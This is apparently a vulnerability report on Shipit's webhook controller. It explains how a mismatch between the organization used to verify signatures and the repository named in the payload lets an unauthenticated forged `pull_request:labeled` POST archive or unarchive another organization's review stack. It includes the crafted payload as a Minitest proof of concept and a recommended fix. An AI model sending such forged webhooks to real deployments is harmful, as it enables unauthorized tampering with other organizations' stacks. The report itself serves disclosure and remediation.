### Title
Cross-tenant `pull_request:labeled` forgery via decoupled `repository_owner` verifier selection and `repository.full_name` handler target - (File: `app/controllers/shipit/webhooks_controller.rb`)

### Summary
`Shipit::WebhooksController#verify_signature` selects which `GitHubApp`/secret validates a webhook using `repository_owner`, which falls back to the attacker-controlled `organization.login` field when `repository.owner.login` is omitted. `LabeledHandler`, however, resolves the actual affected repository/stack from the independent, attacker-controlled `repository.full_name` field. Because these two fields are never checked for consistency, and GitHub App webhook secrets are configured per-organization, naming a lenient (no-secret) organization for verification while pointing `repository.full_name` at any other org's repo lets an unauthenticated attacker archive/unarchive that other org's review stack.

### Finding Description
The broken binding is the equality that the codebase implicitly (but never actually) enforces: `repository_owner used in Shipit.github(organization: repository_owner) == owner(params.repository.full_name)`. These come from two independent JSON fields:

- `app/controllers/shipit/webhooks_controller.rb:59-62` — `repository_owner` is `params.dig('repository','owner','login') || params.dig('organization','login')`, used only to pick which `GitHubApp` verifies the HMAC signature (`app/controllers/shipit/webhooks_controller.rb:24-30`).
- `app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb:33-35,65-67` — the `ExplicitParameters` schema requires `repository.full_name` but never requires `repository.owner.login`; `repository` (and therefore the mutated `Stack`) is resolved via `Shipit::Repository.from_github_repo_name(params.repository.full_name)`.

In `lib/shipit/github_app.rb:76-83`, `verify_webhook_signature` returns `true` unconditionally when `webhook_secret` is blank for the selected organization (`return true unless webhook_secret`). In multi-org configurations (`lib/shipit.rb:170-200`, demonstrated by `test/dummy/config/secrets_double_github_app.yml`), each org can have an independently configured (or absent) `webhook_secret`.

Exploit flow: the attacker sends `POST /webhooks` with `X-Github-Event: pull_request`, a body containing `action: "labeled"`, an open `pull_request` with/without the provisioning label, `sender.login`, and:
- `repository: { full_name: "victim-org/victim-repo" }` (no `owner` key), and
- `organization: { login: "lenient-org" }` where `lenient-org` is any organization known to the Shipit installation whose `webhook_secret` is unset.

`repository_owner` resolves to `"lenient-org"`, `Shipit.github(organization: "lenient-org").verify_webhook_signature` returns `true` regardless of signature/absence of `X-Hub-Signature`, and the request passes `verify_signature`. `LabeledHandler` then loads `victim-org/victim-repo`'s `Repository`, builds a `ReviewStackAdapter` scoped to `repository.review_stacks`, and calls `stack.archive!`/`stack.unarchive!` (`app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb:49-57`, `app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb:23-50`), which invokes `remove_from_provisioning_queue`, `deprovision`, and `Stack#archive!`/`#unarchive!` on the victim org's real stack — a repository-crossing mutation that never authenticated against `victim-org`'s own secret.

None of the existing guards prevent this: `drop_unhandled_event` only checks the event type exists; `ExplicitParameters` never requires `repository.owner.login`; `GithubOrganizationUnknown` only fires if the named organization is entirely absent from config, not if it is a different (valid) org than the target repo's owner; there is no cross-check anywhere that the verifying organization matches the owner embedded in `repository.full_name`.

### Impact Explanation
An unauthenticated attacker can archive or unarchive a review stack belonging to a completely different organization/repository than the one whose (lenient/absent) secret they exploited to pass verification — a payload for one repository mutating another repository's stack, matching the Critical category ("a payload for one repository mutating another's stack"). Repeated calls let the attacker toggle archive state at will for any stack whose full name they can guess/know, as long as any one organization in the deployment lacks a `webhook_secret`. Blast radius spans every organization/repository configured on the same Shipit instance, not just the lenient one.

### Likelihood Explanation
Requires: (1) a multi-organization Shipit deployment (`lib/shipit.rb` multi-org schema), (2) at least one configured organization with no `webhook_secret` set (an operator configuration choice, explicitly documented as "optional" in `docs/setup.md`), and (3) the attacker knowing that organization's login and the victim's `owner/repo` full name (both are typically public/discoverable on GitHub). No GitHub secret, session, or API token is needed. Attacker cost is a single crafted HTTP POST; the attack is fully repeatable and does not require live GitHub API access.

### Recommendation
Bind webhook signature verification to the same repository/organization the handler will act on: derive `repository_owner` solely from `repository.owner.login` (or reject the request if it is absent), and additionally verify that `params.repository.full_name`'s owner matches the organization whose secret validated the signature before dispatching to handlers. Consider also disallowing (or clearly isolating) organizations with no configured `webhook_secret` from acting as a fallback verifier for events referencing unrelated repositories.

### Proof of Concept
Minitest under `test/controllers/webhooks_controller_test.rb` (schematic, since exact fixtures require an org with `webhook_secret: nil` and a separate victim org/stack that would normally require a secret):

```ruby
test "pull_request labeled forges cross-org archive via organization fallback" do
  # Precondition binding under test:
  #   verifying_org = repository_owner (webhooks_controller#repository_owner)
  #   target_org    = owner(params.repository.full_name) (labeled_handler#repository)
  # Claim: verifying_org == target_org is NOT enforced.

  victim_stack = shipit_stacks(:shipit) # belongs to org "shopify", has review_stacks_enabled
  victim_repo_full_name = victim_stack.repository.full_name # e.g. "shopify/shipit-engine"

  payload = {
    action: 'labeled',
    number: victim_stack.pull_request.number,
    pull_request: {
      id: 1, number: victim_stack.pull_request.number, url: 'https://api.github.com/x',
      title: 't', state: 'open', additions: 1, deletions: 1,
      head: { sha: 'a' * 40, ref: 'some-branch' },
      user: { login: 'attacker' },
      assignees: [],
      labels: [{ name: 'shipit-ignore' }] # provisioning label per repository config
    },
    repository: { full_name: victim_repo_full_name }, # owner.login intentionally omitted
    organization: { login: 'lenient-org' },            # org configured with no webhook_secret
    sender: { login: 'attacker' }
  }.to_json

  @request.headers['X-Github-Event'] = 'pull_request'
  @request.headers['X-Hub-Signature'] = 'sha1=deadbeef' # arbitrary/invalid signature

  assert_equal true, Shipit.github(organization: 'lenient-org').send(:webhook_secret).blank?

  assert_changes -> { victim_stack.reload.archived? } do
    post :create, body: payload, as: :json
  end

  assert_response :ok
end
```

Both sides of the equality diverge: `repository_owner == "lenient-org"` (used for signature verification) while the actually mutated stack belongs to `"shopify"` (from `repository.full_name`) — confirming the binding is broken and the victim's stack state changes without its own organization's secret ever being checked. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-62)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end

    def check_if_ping
      head(:ok) if event == 'ping'
    end

    def event
      request.headers.fetch('X-Github-Event')
    end

    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** lib/shipit.rb (L170-200)
```ruby
  def github(organization: github_default_organization)
    # Backward compatibility
    # nil signifies the single github app config schema is being used
    if github_default_organization.nil?
      config = secrets.github
    else
      config = github_app_config(organization)
      raise GithubOrganizationUnknown, organization if config.nil?
    end
    @github ||= {}
    @github[organization] ||= GitHubApp.new(organization, config)
  end

  def github_default_organization
    return nil unless secrets&.github

    org = secrets.github.keys.first
    TOP_LEVEL_GH_KEYS.include?(org) ? nil : org
  end

  def github_organizations
    return [nil] unless github_default_organization

    secrets.github.keys
  end

  def github_app_config(organization)
    github_config = secrets.github.deep_transform_keys(&:downcase)
    github_organization = organization.downcase.to_sym
    github_config[github_organization]
  end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/labeled_handler.rb (L33-67)
```ruby
            requires :repository do
              requires :full_name, String
            end
            requires :sender do
              requires :login, String
            end
          end

          def process
            return unless respond_to_label_change?

            handle
          end

          private

          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end

          def stack
            @stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end

          def repository
            @repository ||= Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
                            Shipit::NullRepository.new
```

**File:** app/models/shipit/webhooks/handlers/pull_request/review_stack_adapter.rb (L23-50)
```ruby
          def archive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no Stack exists. Ignoring."
              )
              return true
            end
            return if stack.archived?

            stack.remove_from_provisioning_queue
            stack.deprovision
            stack.archive!(user, *args, &block)
          end

          def unarchive!(*args, &block)
            if stack.blank?
              Rails.logger.info(
                "Processing #{action} event for #{repo_name} PR #{pr_number} but no ReviewStack exists. Creating."
              )
              return create!
            end
            return unless stack.archived?

            stack.transaction do
              Shipit::ReviewStackProvisioningQueue.add(stack)
              stack.unarchive!(*args, &block)
            end
          end
```
